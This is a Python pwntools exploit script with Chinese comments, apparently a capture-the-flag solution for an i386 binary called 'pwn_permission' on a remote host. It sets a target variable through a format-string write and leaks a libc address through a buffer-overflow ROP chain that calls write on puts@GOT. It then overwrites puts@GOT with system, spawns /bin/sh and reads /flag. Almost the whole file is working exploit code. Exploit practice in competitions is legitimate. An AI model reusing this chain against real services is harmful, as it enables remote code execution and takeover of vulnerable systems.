
from pwn import *
import time

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# ====== 已知准确的偏移 ======
PUTS_OFFSET = 0x6d1e0
SYSTEM_OFFSET = 0x41360

target_val_addr = 0x804c030
puts_got = elf.got['puts']

log.info(f"target_val地址: 0x{target_val_addr:x}")
log.info(f"puts@GOT地址: 0x{puts_got:x}")

# ====== Step 1: 泄露libc基址 ======
log.info("\nStep 1: 泄露libc基址...")
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)

# 设置target_val=5
fmt_payload = b'%5c%6$na' + p32(target_val_addr)
conn.send(fmt_payload)
time.sleep(2)

response = conn.recv(timeout=5)
if b'Input:' not in response:
    log.error("没触发vuln！")
    conn.close()
    exit(1)

# 泄露puts地址
write_plt = elf.plt['write']
vuln_addr = elf.symbols['vuln']
payload = b'A' * 148
payload += p32(write_plt)
payload += p32(vuln_addr)
payload += p32(1)
payload += p32(puts_got)
payload += p32(4)
conn.send(payload)
time.sleep(2)

response = conn.recv(timeout=5)
puts_leak = u32(response[:4])
libc_base = puts_leak - PUTS_OFFSET
system_addr = libc_base + SYSTEM_OFFSET

log.info(f"puts地址: 0x{puts_leak:x}")
log.info(f"libc基址: 0x{libc_base:x}")
log.info(f"system地址: 0x{system_addr:x}")

conn.close()

# ====== Step 2: 用格式字符串覆盖GOT ======
log.info("\nStep 2: 覆盖GOT...")
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)

# 构造格式字符串payload来设置target_val=5并覆盖puts@GOT为system
# 分解system_addr成两个16位的值
system_low = system_addr & 0xffff
system_high = (system_addr >> 16) & 0xffff
log.info(f"system低16位: 0x{system_low:x}")
log.info(f"system高16位: 0x{system_high:x}")

# 我们要写的地址
addrs = b''
addrs += p32(puts_got + 2)  # 写高16位的地址
addrs += p32(puts_got)      # 写低16位的地址
addrs += p32(target_val_addr)  # 写target_val=5的地址

# 构造格式字符串
# 参数位置从6开始（因为前4个是参数，然后是buffer）
fmt = b''

# 先写高16位
if system_high > len(addrs):
    fmt += b'%' + str(system_high - len(addrs)).encode() + b'c'
fmt += b'%6$hn'

# 再写低16位
if system_low > system_high:
    fmt += b'%' + str(system_low - system_high).encode() + b'c'
elif system_low < system_high:
    fmt += b'%' + str((system_low + 0x10000) - system_high).encode() + b'c'
fmt += b'%7$hn'

# 最后写target_val=5
if 5 > system_low:
    fmt += b'%' + str(5 - system_low).encode() + b'c'
elif 5 < system_low:
    fmt += b'%' + str((5 + 0x10000) - system_low).encode() + b'c'
fmt += b'%8$hn'

# 完整的payload
payload = addrs + fmt

log.info(f"发送GOT覆盖payload...")
conn.send(payload)
time.sleep(2)

# 接收响应
try:
    response = conn.recv(timeout=3)
    log.info(f"响应: {response}")
    
    if b'Input:' in response:
        log.success("🎉🎉🎉 完美！vuln被触发了！")
        log.success("现在程序调用puts时，实际会调用system！")
        
        # 发送"/bin/sh"作为第一个命令
        conn.sendline(b'/bin/sh')
        time.sleep(1)
        
        # 现在cat /flag
        conn.sendline(b'cat /flag')
        time.sleep(3)
        
        try:
            flag = conn.recv(timeout=5)
            log.info(f"收到的内容: {flag}")
            
            if b'ISCC' in flag:
                log.success("🎉🎉🎉🎉🎉🎉🎉🎉🎉")
                log.success(f"🎉 成功获取flag: {flag}")
                log.success("🎉🎉🎉🎉🎉🎉🎉🎉🎉")
                exit(0)
                
        except Exception as e:
            log.error(f"读flag时出错: {e}")
            log.info("进入交互模式...")
            conn.interactive()
            
except Exception as e:
    log.error(f"发生错误: {e}")

conn.close()
